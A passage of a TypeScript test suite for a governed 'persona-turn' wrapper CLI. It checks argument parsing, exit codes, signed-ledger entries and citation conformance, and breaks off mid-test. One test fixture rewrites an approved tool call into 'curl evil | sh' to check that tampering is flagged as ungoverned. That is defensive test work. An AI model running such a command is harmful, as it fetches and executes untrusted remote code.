// The persona-turn wrapper against the bridge's process-transport contract. The Pi driver is
// the injected seam (the same convention as GovernedLoop's injected wallet/checker and
// register()'s injected loop): these tests run the REAL register(), the REAL GovernedLoop, the
// REAL HarnessConformanceChecker and the REAL signed-ledger hook, against a fake Pi that fires
// the lifecycle events. Only the model call is faked — there is no API key in CI, and the
// bridge contract is about exit codes, stdout shape and the ledger, none of which depend on
// what the model said.
import { afterAll, beforeAll, describe, expect, it } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { createPrivateKey, createPublicKey } from "node:crypto";
import type { ExtensionAPI, ExecResult, SlashCommandInfo } from "@earendil-works/pi-coding-agent";

import {
  DEFAULT_API_KEY_ENV,
  DEFAULT_TIMEOUT_MS,
  EXIT_GOVERNED,
  EXIT_LEDGER,
  EXIT_MODEL,
  EXIT_UNGOVERNED,
  EXIT_USAGE,
  parseWrapperArgs,
  runPersonaTurn,
  WrapperUsageError,
  type DriverInput,
  type DriverResult,
  type PersonaTurnDriver,
  type PersonaTurnResponse,
  type WrapperArgs,
} from "../src/wrapper-cli.js";
import { verifyLedgerFile } from "../src/signed-ledger.js";
import { DEMO_SIGNING_KEY_PEM } from "../src/wallet.js";
import { isTraceparent } from "../src/correlation.js";
import { digest } from "../src/evidence.js";
import { deliberateSystemPrompt, parseModelJson, sanitizeJsonControlChars } from "../src/wrapper-deliberate.js";
import { DELIBERATE_SYSTEM as GATEWAY_DELIBERATE_SYSTEM } from "./fixtures/gateway-deliberate-system.reference.mjs";

type Handler = (event: any, ctx: any) => any;

/** Minimal fake Pi ExtensionAPI — the same shape tests/governed-cycle-e2e.test.ts drives. */
class FakePi {
  handlers = new Map<string, Handler[]>();
  commands = new Map<string, unknown>();
  registerCommand(name: string, options: unknown): void {
    this.commands.set(name, options);
  }
  on(event: string, handler: Handler): void {
    this.handlers.set(event, [...(this.handlers.get(event) ?? []), handler]);
  }
  getCommands(): SlashCommandInfo[] {
    return [];
  }
  getAllTools(): unknown[] {
    return [];
  }
  sendMessage(): void {}
  async exec(): Promise<ExecResult> {
    return { stdout: "{}", stderr: "", code: 0, killed: false };
  }
  async fire(event: string, payload: any, cwd: string): Promise<any> {
    let result: any;
    for (const handler of this.handlers.get(event) ?? []) result = await handler(payload, { cwd, hasUI: false, isIdle: () => true });
    return result;
  }
  asApi(): ExtensionAPI {
    return this as unknown as ExtensionAPI;
  }
}

/** A tool-free turn, the shape a persona answer takes: prompt in, text out, no tool calls. */
async function fireAnswerTurn(pi: FakePi, input: DriverInput, turnIndex = 0): Promise<void> {
  await pi.fire("turn_start", { turnIndex, timestamp: 0 }, input.cwd);
  await pi.fire("input", { text: input.prompt, source: "interactive" }, input.cwd);
  await pi.fire("before_agent_start", { prompt: input.prompt, systemPrompt: input.systemPrompt ?? "you are pi", systemPromptOptions: {} }, input.cwd);
  await pi.fire("context", { messages: [{ role: "user" }] }, input.cwd);
  await pi.fire("agent_end", { messages: [{ role: "user" }, { role: "assistant" }] }, input.cwd);
  await pi.fire("turn_end", { turnIndex, message: { role: "assistant" }, toolResults: [] }, input.cwd);
}

const OK_RESULT: DriverResult = { reply: "The persona says: proceed.", stopReason: "stop", model: "anthropic/claude-sonnet-4-5" };

/** Build a driver that installs the wrapper's extension on a FakePi and plays `script`. */
function fakeDriver(
  script: (pi: FakePi, input: DriverInput) => Promise<void>,
  result: DriverResult = OK_RESULT,
  seen: DriverInput[] = [],
): PersonaTurnDriver {
  return async (input) => {
    seen.push(input);
    const pi = new FakePi();
    await input.extension(pi.asApi());
    await script(pi, input);
    return result;
  };
}

let root = "";
let workspace = "";
let keyPath = "";

function baseArgs(overrides: Partial<WrapperArgs> = {}): WrapperArgs {
  return {
    prompt: "Should we ship on Friday?",
    cwd: workspace,
    model: "anthropic/claude-sonnet-4-5",
    signingKeyPath: keyPath,
    ledgerPath: join(root, `ledger-${Math.random().toString(36).slice(2)}.jsonl`),
    apiKeyEnv: DEFAULT_API_KEY_ENV,
    tools: [],
    timeoutMs: DEFAULT_TIMEOUT_MS,
    groundingDocIds: [],
    citationRequired: false,
    ...overrides,
  };
}

const ENV_WITH_KEY = { [DEFAULT_API_KEY_ENV]: "sk-test-not-a-real-key" };

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), "pi-kcp-wrapper-"));
  workspace = join(root, "workspace");
  mkdirSync(join(workspace, ".pi"), { recursive: true });
  writeFileSync(join(workspace, ".pi", "kcp.json"), JSON.stringify({ enabled: true, autoRecall: false, governance: "full" }));
  keyPath = join(root, "persona.pem");
  writeFileSync(keyPath, DEMO_SIGNING_KEY_PEM);
});
afterAll(() => rmSync(root, { recursive: true, force: true }));

describe("parseWrapperArgs — the bridge argv template shape", () => {
  it("accepts flag-per-value argv and applies defaults", () => {
    const args = parseWrapperArgs([
      "--prompt", "hello", "--cwd", "/w", "--model", "anthropic/x", "--signing-key", "/k.pem", "--ledger", "/l.jsonl",
      "--tools", "read, grep,,", "--key-id", "persona-a",
    ]);
    expect(args).toMatchObject({
      prompt: "hello", cwd: "/w", model: "anthropic/x", signingKeyPath: "/k.pem", ledgerPath: "/l.jsonl",
      tools: ["read", "grep"], keyId: "persona-a", apiKeyEnv: DEFAULT_API_KEY_ENV, timeoutMs: DEFAULT_TIMEOUT_MS,
    });
  });

  it("fails closed on unknown flags, missing values, duplicates and relative paths", () => {
    const ok = ["--prompt", "p", "--cwd", "/w", "--model", "m", "--signing-key", "/k", "--ledger", "/l"];
    expect(() => parseWrapperArgs([...ok, "--follow"])).toThrow(WrapperUsageError);
    expect(() => parseWrapperArgs([...ok, "--grounding"])).toThrow(/requires a value/);
    expect(() => parseWrapperArgs([...ok, "--prompt", "again"])).toThrow(/given twice/);
    expect(() => parseWrapperArgs(ok.slice(2))).toThrow(/--prompt is required/);
    expect(() => parseWrapperArgs([...ok.slice(0, 2), "--cwd", "relative/dir", ...ok.slice(4)])).toThrow(/absolute path/);
    expect(() => parseWrapperArgs([...ok, "--timeout-ms", "50"])).toThrow(/--timeout-ms/);
    expect(() => parseWrapperArgs([...ok, "--api-key-env", "not a name"])).toThrow(/environment variable name/);
  });
});

describe("runPersonaTurn — a governed turn", () => {
  it("emits exactly one JSON object on stdout, exits 0, and persists a verifiable signed ledger entry", async () => {
    const seen: DriverInput[] = [];
    const args = baseArgs({ keyId: "persona-a", grounding: "Release freeze is Thursday 17:00." });
    const outcome = await runPersonaTurn(args, {
      driver: fakeDriver(fireAnswerTurn, OK_RESULT, seen),
      env: ENV_WITH_KEY,
      now: () => "2026-09-27T12:00:00.000Z",
    });

    expect(outcome.stderr).toBe("");
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    // The bridge does JSON.parse over the WHOLE buffered stdout: one document, one line.
    expect(outcome.stdout.endsWith("\n")).toBe(true);
    expect(outcome.stdout.trim().split("\n")).toHaveLength(1);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    expect(response).toBeTypeOf("object");
    expect(Array.isArray(response)).toBe(false);

    expect(response.reply).toBe(OK_RESULT.reply);
    expect(response.replyDigest).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(response.governed).toBe(true);
    expect(response.turnCount).toBe(1);
    expect(isTraceparent(response.correlationId)).toBe(true);
    expect(response.turns[0]!.stages.map((s) => s.stage)).toEqual(["plan", "load", "synthesize", "ground", "assess", "approve", "act"]);
    expect(response.turns[0]!.stages.filter((s) => s.status === "skipped").map((s) => s.stage)).toEqual(["approve", "act"]);

    // The ledger on disk is what the response claims it is, and it verifies against the pinned key.
    expect(response.ledger.path).toBe(args.ledgerPath);
    expect(response.ledger.entries).toEqual([
      { turnIndex: 0, correlationId: response.correlationId, signedAt: "2026-09-27T12:00:00.000Z", keyId: "persona-a" },
    ]);
    const publicKeyPem = createPublicKey(createPrivateKey(DEMO_SIGNING_KEY_PEM)).export({ type: "spki", format: "pem" }).toString();
    expect(response.ledger.publicKey).toBe(publicKeyPem);
    const verified = await verifyLedgerFile(args.ledgerPath, [publicKeyPem]);
    expect(verified).toEqual([{ lineNumber: 1, turnIndex: 0, correlationId: response.correlationId, valid: true }]);
    expect(readFileSync(args.ledgerPath, "utf8").trim().split("\n")).toHaveLength(1);

    // What the driver was asked to do: the credential from env (never argv), grounding
    // appended to the system prompt, no tools, and pi-kcp as the extension.
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatchObject({
      cwd: workspace, model: args.model, prompt: args.prompt, apiKey: ENV_WITH_KEY[DEFAULT_API_KEY_ENV],
      appendSystemPrompt: "Release freeze is Thursday 17:00.", tools: [], timeoutMs: DEFAULT_TIMEOUT_MS,
    });
    expect(seen[0]!.systemPrompt).toBeUndefined();
  });

  it("joins --persona/--persona-file and --grounding/--grounding-file into the system prompt", async () => {
    const personaFile = join(root, "persona.md");
    const groundingFile = join(root, "grounding.md");
    writeFileSync(personaFile, "You are the release manager.");
    writeFileSync(groundingFile, "Two P1 bugs open.");
    const seen: DriverInput[] = [];
    const outcome = await runPersonaTurn(
      baseArgs({ persona: "Persona: cautious.", personaFile, grounding: "Friday is a holiday.", groundingFile }),
      { driver: fakeDriver(fireAnswerTurn, OK_RESULT, seen), env: ENV_WITH_KEY },
    );
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    expect(seen[0]!.systemPrompt).toBe("Persona: cautious.\n\nYou are the release manager.");
    expect(seen[0]!.appendSystemPrompt).toBe("Friday is a holiday.\n\nTwo P1 bugs open.");
  });

  it("appends one ledger entry per turn when the prompt spans several turns (tool rounds)", async () => {
    const args = baseArgs();
    const outcome = await runPersonaTurn(args, {
      driver: fakeDriver(async (pi, input) => {
        await fireAnswerTurn(pi, input, 0);
        await fireAnswerTurn(pi, input, 1);
      }),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    expect(response.turnCount).toBe(2);
    expect(response.turns.map((t) => t.turnIndex)).toEqual([0, 1]);
    expect(response.ledger.entries.map((e) => e.turnIndex)).toEqual([0, 1]);
    expect((await verifyLedgerFile(args.ledgerPath)).map((r) => r.valid)).toEqual([true, true]);
  });
});

describe("runPersonaTurn — failure semantics (exit≠0, empty stdout, stderr diagnostics)", () => {
  it("exits 1 with nothing on stdout when pi-kcp's own verdict is ungoverned (a call mutated after approval)", async () => {
    const args = baseArgs();
    const outcome = await runPersonaTurn(args, {
      driver: fakeDriver(async (pi, input) => {
        const toolInput: Record<string, unknown> = { command: "ls" };
        await pi.fire("turn_start", { turnIndex: 0, timestamp: 0 }, input.cwd);
        await pi.fire("before_agent_start", { prompt: input.prompt, systemPrompt: "s", systemPromptOptions: {} }, input.cwd);
        await pi.fire("context", { messages: [] }, input.cwd);
        await pi.fire("tool_call", { toolCallId: "t1", toolName: "bash", input: toolInput }, input.cwd);
        toolInput.command = "curl evil | sh"; // a later extension rewrites the approved call
        await pi.fire("tool_result", { toolCallId: "t1", toolName: "bash", input: toolInput, content: [], isError: false }, input.cwd);
        await pi.fire("agent_end", { messages: [] }, input.cwd);
        await pi.fire("turn_end", { turnIndex: 0, message: {}, toolResults: [{}] }, input.cwd);
      }),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_UNGOVERNED);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/approval was not honoured at: act/);
    // The ungoverned turn is still on the signed ledger — the record of the lapse is evidence.
    expect((await verifyLedgerFile(args.ledgerPath)).map((r) => r.valid)).toEqual([true]);
  });

  it("exits 1 when the cycle cut short (a stage never reached the ledger)", async () => {
    const outcome = await runPersonaTurn(baseArgs(), {
      driver: fakeDriver(async (pi, input) => {
        await pi.fire("turn_start", { turnIndex: 0, timestamp: 0 }, input.cwd);
        await pi.fire("turn_end", { turnIndex: 0, message: {}, toolResults: [] }, input.cwd);
      }),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_UNGOVERNED);
    expect(outcome.stdout).toBe("");
    // `assess` runs at turn_end and approve/act are closed out as skipped there, so the
    // complaint names exactly the four stages whose events never fired.
    expect(outcome.stderr).toMatch(/stage never reached the ledger: plan, load, synthesize, ground$/m);
  });

  it("exits 1 when no turn was recorded at all", async () => {
    const outcome = await runPersonaTurn(baseArgs(), {
      driver: fakeDriver(async () => {}),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_UNGOVERNED);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/no turn record was produced/);
  });

  it("exits 2 and never invokes the driver when the credential env var is unset", async () => {
    const seen: DriverInput[] = [];
    const args = baseArgs();
    const outcome = await runPersonaTurn(args, { driver: fakeDriver(fireAnswerTurn, OK_RESULT, seen), env: {} });
    expect(outcome.exitCode).toBe(EXIT_USAGE);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toContain(DEFAULT_API_KEY_ENV);
    expect(seen).toEqual([]);
    expect(() => readFileSync(args.ledgerPath)).toThrow(); // nothing was written either
  });

  it("exits 2 for an unusable signing key, missing workspace config, or governance off", async () => {
    const badKey = join(root, "bad.pem");
    writeFileSync(badKey, "not a key");
    expect((await runPersonaTurn(baseArgs({ signingKeyPath: badKey }), { driver: fakeDriver(fireAnswerTurn), env: ENV_WITH_KEY })).exitCode).toBe(EXIT_USAGE);

    const bare = join(root, "bare");
    mkdirSync(bare, { recursive: true });
    const noConfig = await runPersonaTurn(baseArgs({ cwd: bare }), { driver: fakeDriver(fireAnswerTurn), env: ENV_WITH_KEY });
    expect(noConfig.exitCode).toBe(EXIT_USAGE);
    expect(noConfig.stderr).toMatch(/kcp\.json not found/);

    const off = join(root, "off");
    mkdirSync(join(off, ".pi"), { recursive: true });
    writeFileSync(join(off, ".pi", "kcp.json"), JSON.stringify({ enabled: true, governance: "off" }));
    const offOutcome = await runPersonaTurn(baseArgs({ cwd: off }), { driver: fakeDriver(fireAnswerTurn), env: ENV_WITH_KEY });
    expect(offOutcome.exitCode).toBe(EXIT_USAGE);
    expect(offOutcome.stderr).toMatch(/governance:"off"/);
  });

  it("exits 3 when the model turn errors or is aborted, even though the turn itself was governed", async () => {
    for (const stopReason of ["error", "aborted"] as const) {
      const outcome = await runPersonaTurn(baseArgs(), {
        driver: fakeDriver(fireAnswerTurn, { reply: "", stopReason, errorMessage: "429 rate limited", model: "anthropic/x" }),
        env: ENV_WITH_KEY,
      });
      expect(outcome.exitCode).toBe(EXIT_MODEL);
      expect(outcome.stdout).toBe("");
      expect(outcome.stderr).toContain(`stopReason=${stopReason}`);
      expect(outcome.stderr).toContain("429 rate limited");
    }
  });

  it("exits 3 when the driver throws (Pi refused the prompt)", async () => {
    const outcome = await runPersonaTurn(baseArgs(), {
      driver: async () => { throw new Error("No API key found for anthropic."); },
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_MODEL);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toContain("No API key found for anthropic.");
  });

  it("exits 4 when the signed ledger cannot be written, and says so", async () => {
    // A ledger path whose parent is a regular file: mkdir -p fails, the append never happens.
    const blocker = join(root, "blocker-file");
    writeFileSync(blocker, "");
    const outcome = await runPersonaTurn(baseArgs({ ledgerPath: join(blocker, "ledger.jsonl") }), {
      driver: fakeDriver(fireAnswerTurn),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_LEDGER);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/ledger write failed/);
    expect(outcome.stderr).toMatch(/signed ledger not persisted: 0\/1/);
  });
});

// ── --reply-schema (Sunstone-Atlas#390 G3/G4): the gateway's deliberate-mode contract at the edge ──

const DELIBERATE_OK = {
  position: "Do not ship Friday",
  argument: "Two P1 bugs are open and the freeze is Thursday 17:00; shipping past it violates the release rule.",
  cited_docs: ["doc:release-policy", "doc:bug-tracker"],
  dissent_with: [],
  confidence: 0.85,
};

function deliberateResult(body: unknown, wrap: (json: string) => string = (s) => s): DriverResult {
  const json = typeof body === "string" ? body : JSON.stringify(body);
  return { reply: wrap(json), stopReason: "stop", model: "anthropic/claude-sonnet-4-5" };
}

const LEGACY_ARGV = ["--prompt", "p", "--cwd", "/w", "--model", "m", "--signing-key", "/k", "--ledger", "/l"];

describe("parseWrapperArgs — --reply-schema, --grounding-doc-ids, --citation-required", () => {
  it("parses the deliberate flags; --citation-required is a bare flag that consumes no value", () => {
    const args = parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--grounding-doc-ids", "release-policy, bug-tracker,,", "--citation-required"]);
    expect(args.replySchema).toBe("deliberate");
    expect(args.groundingDocIds).toEqual(["release-policy", "bug-tracker"]);
    expect(args.citationRequired).toBe(true);
    // The bare flag before a value flag must not swallow the next argv element.
    const reordered = parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate-synthesis", "--citation-required", "--grounding-doc-ids", "a"]);
    expect(reordered).toMatchObject({ replySchema: "deliberate-synthesis", citationRequired: true, groundingDocIds: ["a"] });
  });

  it("fails closed on an unknown schema, dependants without --reply-schema, pre-prefixed ids, and duplicates", () => {
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "advisory"])).toThrow(/--reply-schema must be one of deliberate\|deliberate-synthesis/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--grounding-doc-ids", "a"])).toThrow(/--grounding-doc-ids requires --reply-schema/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--citation-required"])).toThrow(/--citation-required requires --reply-schema/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--citation-required"])).toThrow(/needs a non-empty --grounding-doc-ids/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--grounding-doc-ids", "", "--citation-required"])).toThrow(/needs a non-empty --grounding-doc-ids/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--grounding-doc-ids", "doc:a"])).toThrow(/takes bare ids/);
    expect(() => parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--citation-required", "--grounding-doc-ids", "a", "--citation-required"])).toThrow(/given twice/);
  });

  it("an empty --grounding-doc-ids is 'no grounding documents' (the gateway's empty policy.grounding), not an error", () => {
    const args = parseWrapperArgs([...LEGACY_ARGV, "--reply-schema", "deliberate", "--grounding-doc-ids", " , "]);
    expect(args.groundingDocIds).toEqual([]);
  });
});

describe("deliberate system prompt — byte-identical to the gateway's DELIBERATE_SYSTEM", () => {
  const g = "POLICY: release (charter)\nRULES:\n  R1: no Friday ships [→ refuse]\n\nGROUNDING DOCUMENTS (cite by id):\n[doc:release-policy]\nFreeze Thursday 17:00.";

  it("matches the verbatim gateway fixture for every (hasGrounding, isSynthesis) combination", () => {
    for (const hasGrounding of [false, true]) {
      for (const isSynthesis of [false, true]) {
        expect(deliberateSystemPrompt(g, hasGrounding, isSynthesis)).toBe(GATEWAY_DELIBERATE_SYSTEM(g, hasGrounding, isSynthesis));
      }
    }
    // The gating text really is present/absent, not just equal on both sides.
    expect(deliberateSystemPrompt(g, false, false)).not.toContain("cited_docs: list ONLY");
    expect(deliberateSystemPrompt(g, true, false)).toContain("cited_docs: list ONLY doc:<id> values");
    expect(deliberateSystemPrompt(g, false, false)).not.toContain('"coverage"');
    expect(deliberateSystemPrompt(g, false, true)).toContain('"coverage":[{"persona"');
  });

  it("wraps --persona + --grounding (in that order, as the gateway wraps charter + doc blocks) in the scaffold and hands Pi ONE system prompt", async () => {
    const groundingFile = join(root, "grounding-docs.md");
    writeFileSync(groundingFile, "[doc:bug-tracker]\nTwo P1 bugs open.");
    const seen: DriverInput[] = [];
    const outcome = await runPersonaTurn(
      baseArgs({ replySchema: "deliberate", persona: "POLICY: release", grounding: "[doc:release-policy]\nFreeze Thursday 17:00.", groundingFile, groundingDocIds: ["release-policy", "bug-tracker"] }),
      { driver: fakeDriver(fireAnswerTurn, deliberateResult(DELIBERATE_OK), seen), env: ENV_WITH_KEY },
    );
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    expect(seen[0]!.systemPrompt).toBe(GATEWAY_DELIBERATE_SYSTEM("POLICY: release\n\n[doc:release-policy]\nFreeze Thursday 17:00.\n\n[doc:bug-tracker]\nTwo P1 bugs open.", true, false));
    expect(seen[0]!.appendSystemPrompt).toBeUndefined();
    expect(seen[0]!.prompt).toBe("Should we ship on Friday?"); // the request is untouched
  });

  it("uses hasGrounding=false wording when no doc ids are declared, and the synthesis wording for deliberate-synthesis", async () => {
    const seen: DriverInput[] = [];
    await runPersonaTurn(baseArgs({ replySchema: "deliberate-synthesis", persona: "Moderator." }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult({ ...DELIBERATE_OK, cited_docs: [], coverage: [] }), seen),
      env: ENV_WITH_KEY,
    });
    expect(seen[0]!.systemPrompt).toBe(GATEWAY_DELIBERATE_SYSTEM("Moderator.", false, true));
  });
});

describe("runPersonaTurn --reply-schema deliberate — a valid reply passes through as flat fields", () => {
  it("emits position/argument/cited_docs/dissent_with/confidence next to the raw reply, with groundingConformance ALLOW", async () => {
    const args = baseArgs({ replySchema: "deliberate", grounding: "[doc:release-policy] …", groundingDocIds: ["release-policy", "bug-tracker"] });
    const outcome = await runPersonaTurn(args, { driver: fakeDriver(fireAnswerTurn, deliberateResult(DELIBERATE_OK)), env: ENV_WITH_KEY });
    expect(outcome.stderr).toBe("");
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    expect(outcome.stdout.trim().split("\n")).toHaveLength(1);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    // Existing fields keep their meaning: `reply` is the raw model text and the digest is of it.
    expect(response.reply).toBe(JSON.stringify(DELIBERATE_OK));
    expect(response.replyDigest).toBe(digest(JSON.stringify(DELIBERATE_OK)));
    expect(response.governed).toBe(true);
    // The additive fields, flat, model-named.
    expect(response.replySchema).toBe("deliberate");
    expect(response.position).toBe(DELIBERATE_OK.position);
    expect(response.argument).toBe(DELIBERATE_OK.argument);
    expect(response.cited_docs).toEqual(DELIBERATE_OK.cited_docs);
    expect(response.dissent_with).toEqual([]);
    expect(response.confidence).toBe(0.85);
    expect(response.groundingConformance).toEqual({ ok: true, verdict: "ALLOW", reason: "every grounding citation matches a document actually provided" });
    expect("coverage" in response).toBe(false);
    // Ledger unchanged by the schema: one verifiable entry.
    expect((await verifyLedgerFile(args.ledgerPath)).map((r) => r.valid)).toEqual([true]);
  });

  it("tolerates what the gateway tolerates: prose around the JSON object and a raw LF inside a string (sanitizeJsonControlChars)", async () => {
    const withRawLf = `{"position":"Hold","argument":"First paragraph.\n\nSecond paragraph.","cited_docs":["doc:a"],"dissent_with":[],"confidence":0.7}`;
    expect(() => JSON.parse(withRawLf)).toThrow(); // the raw byte really is invalid JSON as-is
    expect(sanitizeJsonControlChars(withRawLf)).toContain("First paragraph.\\n\\nSecond paragraph.");
    expect(parseModelJson(`Sure — here is my position:\n${withRawLf}\nThanks.`)).toMatchObject({ position: "Hold" });

    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["a"] }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(withRawLf, (s) => `Here you go:\n${s}`)),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    expect(response.argument).toBe("First paragraph.\n\nSecond paragraph.");
    expect(response.reply.startsWith("Here you go:")).toBe(true);
  });

  it("absent optional arrays default to [] (the gateway's own default), and citations without declared doc ids are N/A, not checked — as in the gateway", async () => {
    // hasGrounding=false on the gateway means checkGroundingCitations never runs; the model was
    // told `"cited_docs":[]`. Mirror exactly rather than invent a stricter rule here.
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate" }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult({ position: "Ship", argument: "Fine.", confidence: 1, cited_docs: ["doc:whatever"] })),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    expect(response.dissent_with).toEqual([]);
    expect(response.cited_docs).toEqual(["doc:whatever"]);
    expect(response.groundingConformance).toEqual({ ok: true, verdict: "N/A", reason: "policy has no grounding documents" });
  });
});

describe("runPersonaTurn --reply-schema deliberate — fail closed (exit 3, empty stdout, ledger still written)", () => {
  it("refuses a reply that is not JSON at all, and puts the raw text head on stderr for diagnosis", async () => {
    const args = baseArgs({ replySchema: "deliberate", groundingDocIds: ["a"] });
    const outcome = await runPersonaTurn(args, {
      driver: fakeDriver(fireAnswerTurn, { reply: "I think we should not ship on Friday.", stopReason: "stop", model: "anthropic/x" }),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_MODEL);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/does not match --reply-schema deliberate: model output unparseable: no JSON in model output/);
    expect(outcome.stderr).toContain('rawTextHead2000="I think we should not ship on Friday."');
    // The turn WAS governed and IS on the ledger — what was refused is the answer, as the gateway
    // signs an outcome:"refuse" receipt rather than pretending the call never happened.
    expect((await verifyLedgerFile(args.ledgerPath)).map((r) => r.valid)).toEqual([true]);
  });

  it("refuses truncated JSON (the gateway's live-observed max_tokens failure shape)", async () => {
    const truncated = JSON.stringify(DELIBERATE_OK).slice(0, 60);
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["a"] }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(truncated)),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_MODEL);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/unparseable/);
  });

  it("refuses a parseable object that is not the shape: missing argument, confidence outside [0,1], cited_docs not an array of strings, a JSON array", async () => {
    const cases: Array<[unknown, RegExp]> = [
      [{ ...DELIBERATE_OK, argument: undefined }, /argument is missing/],
      [{ ...DELIBERATE_OK, position: "" }, /position is missing/],
      [{ ...DELIBERATE_OK, confidence: 1.5 }, /confidence is not a number in \[0, 1\] \(got 1\.5\)/],
      [{ ...DELIBERATE_OK, confidence: "high" }, /confidence is not a number/],
      [{ ...DELIBERATE_OK, cited_docs: "doc:release-policy" }, /cited_docs is not an array/],
      [{ ...DELIBERATE_OK, dissent_with: [{ persona: "cfo" }] }, /dissent_with\[0\] is not a string/],
    ];
    for (const [body, pattern] of cases) {
      const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy", "bug-tracker"] }), {
        driver: fakeDriver(fireAnswerTurn, deliberateResult(body)),
        env: ENV_WITH_KEY,
      });
      expect(outcome.exitCode).toBe(EXIT_MODEL);
      expect(outcome.stdout).toBe("");
      expect(outcome.stderr).toMatch(pattern);
    }
    // `parseModelJson` finds the first `{…}` span, so a bare array has no object at all.
    const arrayOutcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate" }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult("[1,2,3]")),
      env: ENV_WITH_KEY,
    });
    expect(arrayOutcome.exitCode).toBe(EXIT_MODEL);
    expect(arrayOutcome.stderr).toMatch(/no JSON in model output/);
  });

  it("refuses a fabricated citation — an id not in --grounding-doc-ids — naming it (G4)", async () => {
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy"] }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult({ ...DELIBERATE_OK, cited_docs: ["doc:release-policy", "doc:invented-memo"] })),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_MODEL);
    expect(outcome.stdout).toBe("");
    expect(outcome.stderr).toMatch(/grounding citation conformance DENY: citation\(s\) not backed by a grounding document actually provided in this request: doc:invented-memo/);
    expect(outcome.stderr).toContain('provided=["doc:release-policy"]');
  });

  it("the doc: prefix is part of the contract: a bare id cited without it is fabricated, exactly as in conformance.mjs", async () => {
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy"] }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult({ ...DELIBERATE_OK, cited_docs: ["release-policy"] })),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_MODEL);
    expect(outcome.stderr).toContain("not backed by a grounding document actually provided in this request: release-policy");
  });

  it("--citation-required refuses an empty cited_docs; without it an empty list is N/A and passes", async () => {
    const uncited = deliberateResult({ ...DELIBERATE_OK, cited_docs: [] });
    const required = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy"], citationRequired: true }), {
      driver: fakeDriver(fireAnswerTurn, uncited),
      env: ENV_WITH_KEY,
    });
    expect(required.exitCode).toBe(EXIT_MODEL);
    expect(required.stdout).toBe("");
    expect(required.stderr).toMatch(/DENY: the charter requires every decision to cite at least one grounding document \(citation_required\), and this decision cited none/);

    const optional = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy"] }), {
      driver: fakeDriver(fireAnswerTurn, uncited),
      env: ENV_WITH_KEY,
    });
    expect(optional.exitCode).toBe(EXIT_GOVERNED);
    expect((JSON.parse(optional.stdout) as PersonaTurnResponse).groundingConformance).toEqual({ ok: true, verdict: "N/A", reason: "no grounding citations to verify" });

    const cited = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy", "bug-tracker"], citationRequired: true }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(DELIBERATE_OK)),
      env: ENV_WITH_KEY,
